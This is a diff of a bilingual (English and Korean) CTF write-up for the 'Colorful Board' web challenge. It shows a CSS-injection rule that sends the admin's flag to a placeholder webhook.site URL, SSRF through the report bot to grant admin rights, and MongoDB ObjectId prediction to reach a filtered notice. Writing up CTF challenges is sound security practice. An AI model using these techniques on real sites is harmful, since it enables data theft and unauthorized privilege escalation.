@@ -6,11 +6,13 @@ category: CTF
 draft: false
 ---
 
+[한국어로 보기](#한국어)
+
 ### Table of contents
 
-- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-360pt-15solves-🩸firstblood)
+- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-en)
 
-## Colorful Board (360pt, 15solves, 🩸firstblood) {#colorful-board-en}
+<h2 id="colorful-board-en">Colorful Board (360pt, 15solves, 🩸firstblood)</h2>
 
 :::important[info]
 
@@ -152,7 +154,9 @@ Wow, there is `input` that shows current username!
 Finally we can do css injection like this code and get first part of flag.
 
 ```
-input[class=user][value^="DEAD{....."]
+input[class=user][value^="DEAD{....."] {
+  background: url('https://webhook.site/xxxxxxxx'+'?flag='+flag)
+}
 ```
 
 To get second part of flag, we should look at the `/admin/notice` route.
@@ -243,6 +247,7 @@ mongodb's id is predictable because of [this logic](https://github.com/andresria
 so, id of flag report may be `66a4861{7-c}b3027e48519f2d69`
 
 ### Exploit Code
+
 ```py
 import string
 from requests import *
@@ -328,11 +333,12 @@ print(res.text)
 FLAG: `DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}`
 
 # 한국어
+
 ### Table of contents
 
-- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-360pt-15solves-🩸firstblood)
+- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-ko)
 
-## Colorful Board (360pt, 15solves, 🩸firstblood)
+<h2 id="colorful-board-ko">Colorful Board (360pt, 15solves, 🩸firstblood)</h2>
 
 :::important[info]
 
@@ -343,11 +349,11 @@ FLAG: `DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}`
 ![firstblood](./img/firstblood1.png)
 ![firstblood](./img/firstblood2.png)
 
-Yay! I first-blooded CTF challenge for the first time in my life.  
+내 인생 처음으로 CTF에서 퍼스트 블러드했다.
 
 ### Analysis & Exploit
 
-this challenge consists Nest.js and mongodb. First, I search a flag in the app.
+Nest.js와 mongodb로 구성되어 있는 문제이다. 먼저 플래그를 검색해 역으로 분석을 시작했다.
 
 ```js
 const init_db = async () => {
@@ -366,9 +372,9 @@ const init_db = async () => {
 }
 ```
 
-the flag is devided into two and the first one is Admin's username and the second one is one of notices. And there is `/report` route that make a admin visit a url. (No restrictions on url)
+플래그가 반쪽 두개로 나뉘어 하나는 어드민의 이름으로, 다른 하나는 공지의 내용으로 나뉘어졌다. 그리고 `/report` 루트로 어드민을 url에 접속시킬 수 있다. (참고로 url에 대한 제한은 전혀 없다.)
 
-After that, I found this code in `post.hbs` and `post-edit.hbs`
+그러고 나서 `post.hbs`와 `post-edit.hbs`를 봤다.
 
 ```hbs
 <style>
@@ -388,8 +394,7 @@ After that, I found this code in `post.hbs` and `post-edit.hbs`
 </style>
 ```
 
-this code is vulnerable to css injection because they using `{{{ }}}` instead `{{ }}`. So, we can do css injection by inject some code to `author.personalColor` or `user.personalColor`.  
-Let's read `post.hbs` and `post-edit.hbs` to know attack-vector.  
+이 코드는 `{{ }}` 대신 `{{{ }}}`를 써서 css injection이 가능하다. 즉 `author.personalColor` 또는 `user.personalColor`를 css에 주입시켜서 css injection을 발생시킬 수 있다. 더 자세한 공격 벡터를 찾기 위해 `post.hbs`와 `post-edit.hbs`를 봐보자.
 
 `post.hbs`
 
@@ -414,8 +419,8 @@ Let's read `post.hbs` and `post-edit.hbs` to know attack-vector.
     </div>
 </body>
 ```
-
-In `post.hbs`, there is no attack point to css injection because name of admin is revealed in `<p>` tag. ~~Nothing that could leak `innerText` of `<p>` tag.~~. It is possible this selection `#:~:text={urllib.parse.quote(flag)}` but it doesn't work on this chall.  
+  
+`post.hbs`에서는 admin 이름이 노출된 곳이 `<p>` 태그 밖에 없다. ~~p 태그의 `innerText`를 css injection 하는 것은 불가능하다.고 생각했는데~~ `#:~:text={urllib.parse.quote(flag)}` 이런 형식으로 가능하다. 하지만 이 문제에서는 작동되지 않는다고 한다. (본인은 직접 안해봄)
   
 `post-edit.hbs`
 
@@ -465,19 +470,21 @@ In `post.hbs`, there is no attack point to css injection because name of admin i
 </html>
 ```
 
-Wow, there is `input` that shows current username!
+이번엔 현재 유저이름을 알려주는 `input`이 있다!
 
 ```hbs
 <p>Your account: <input class="user" type="text" value="{{user.username}}" disabled></p>
 ```
 
-Finally we can do css injection like this code and get first part of flag.
+드디어 css injection을 하고 flag의 첫부분을 알 수 있다.
 
 ```
-input[class=user][value^="DEAD{....."]
+input[class=user][value^="DEAD{....."] {
+  background: url('https://webhook.site/xxxxxxxx'+'?flag='+flag)
+}
 ```
 
-To get second part of flag, we should look at the `/admin/notice` route.
+이제 플래그의 두번째 부분을 알게 위해 `/admin/notice` 엔드포인트를 봐보자
 
 in `admin.controller.ts`
 
@@ -521,8 +528,8 @@ export class AdminController {
 }
 ```
 
-To access `/admin/notice`, you need to get admin. Hmm....  
-Let's read `LocalOnlyGuard` in `/admin/grant`.
+`/admin/notice`에 접근하기 위해 admin 권한이 필요하다...흠..  
+유저의 권한을 높이는 `/admin/grant`를 사용하기 위해 `LocalOnlyGuard`를 읽어보자
 
 ```ts
 @Injectable()
@@ -543,9 +550,9 @@ export class LocalOnlyGuard implements CanActivate {
 }
 ```
 
-Oh! This code only checks wheter access ip is localhost. Even this `/admin/grant` route is GET!!! So, we can use SSRF to grant our account by report function.  
+이 코드는 접근된 ip가 로컬호스트인지만 확인한다. 심지어 `/admin/grant`에 접근하는 method는 GET이다!! 즉 `/report` 를 사용하여 SSRF를 진행해 우리의 계정을 admin 권한으로 높일 수 있다.  
 
-After you are granted, `/admin/notice` shows only two notice because flag notice is filtered.
+어드민 권한을 얻으면, `/admin/notice`는 오직 두 개의 notice만 보여준다. 왜냐면 아래 코드에서 flag가 들어간 notice를 필터링하기 때문이다.
 
 ```ts
 @Get('/notice')
@@ -558,13 +565,13 @@ async renderAllNotice() {
 }
 ```
 
-id of first report (asdf) was `66a48616b3027e48519f2d68`  
-id of sencond report (qwer) was `66a4861db3027e48519f2d6a`  
+첫 report (asdf)의 id: `66a48616b3027e48519f2d68`  
+두번째 report (qwer)의 id: `66a4861db3027e48519f2d6a`  
 
-mongodb's id is predictable because of [this logic](https://github.com/andresriancho/mongo-objectid-predict?tab=readme-ov-file#mongo-objectid-introduction).  
-so, id of flag report may be `66a4861{7-c}b3027e48519f2d69`
+mongodb의 id는 [다음과 같은 로직](https://github.com/andresriancho/mongo-objectid-predict?tab=readme-ov-file#mongo-objectid-introduction)으로 생성되기 때문에 예측이 가능하다. 그러므로 flag report의 id는 `66a4861{7-c}b3027e48519f2d69` 중 하나이다.
 
 ### Exploit Code
+
 ```py
 import string
 from requests import *
